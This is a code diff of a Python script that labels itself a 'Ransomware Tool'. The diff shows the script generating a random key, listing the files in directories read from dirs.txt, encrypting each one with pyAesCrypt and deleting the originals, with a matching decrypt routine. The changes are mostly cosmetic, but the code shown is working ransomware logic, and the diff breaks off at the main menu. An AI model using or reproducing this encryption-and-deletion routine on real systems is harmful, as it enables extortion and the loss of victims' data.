@@ -1,10 +1,10 @@
-#Import Libraries
+# Import Libraries
 import pyAesCrypt
 import string
 import random
 import os
 
-#Define Functions
+# Define Functions
 def clear():
     os.system('clear')
 
@@ -26,8 +26,8 @@ def int_input_getter(prompt, num_range):
                 input("Press enter to continue...")
 
 def gen_key():
-    #Generate Symmetric Key & Store in Variable
-    #clear()
+    # Generate Symmetric Key & Store in Variable
+    clear()
     global sym
     passwd=''
     for i in range (15):
@@ -42,15 +42,15 @@ def gen_key():
     print("Symmetric Key is: " + sym)
     print()
 
-def enum_files():  ###NEEDS A FILE LIST FOR EACH DIR
-    #Read Target Directories from 'dir.txt' & Enumerate Them
+def enum_files():
+    # Read Target Directories from 'dir.txt' & Enumerate Them
     f = open('dirs.txt', 'r')
     target_dirs = f.readlines()
     global files
     files=[]
     for dir in target_dirs:
         dir_files = []
-        #Enumerate Target Directory & Populate List
+        # Enumerate Target Directory & Populate List
         dir_files += os.listdir(dir.strip())
         for i in dir_files:
           path = dir.strip() + i
@@ -60,33 +60,35 @@ def enum_files():  ###NEEDS A FILE LIST FOR EACH DIR
 
 def encrypt():
     enum_files()
-    #Encrypt File
-    #clear()
+    # Encrypt Files
+    clear()
     global bufferSize
     bufferSize = 64 * 1024
+    print('Encrypting Files...')
     for i in files:
         new_name=i+'.aes'
         pyAesCrypt.encryptFile(i, new_name, sym, bufferSize)
-        #Delete Original
+        # Delete Originals
         os.remove(i)
-    print("Data is now encrypted")
+    print("Data is now encrypted :)")
     print()
 
 def decrypt():
     enum_files()
-    #Decrypt File
-    #clear()
+    # Decrypt Files
+    clear()
     global bufferSize
     bufferSize = 64 * 1024
+    print('Decrypting Files...')
     for i in files:
         new_name=i.replace('.aes', '')
         pyAesCrypt.decryptFile(i, new_name, sym, bufferSize)
-        #Delete Original
+        # Delete Originals
         os.remove(i)
-    print("Data is now decrypted")
+    print("Data is now decrypted :)")
     print()
 
-#Main Program
+# Main Program
 main_menu = """Ransomware Tool
 1. Gen-key
 2. Encrypt
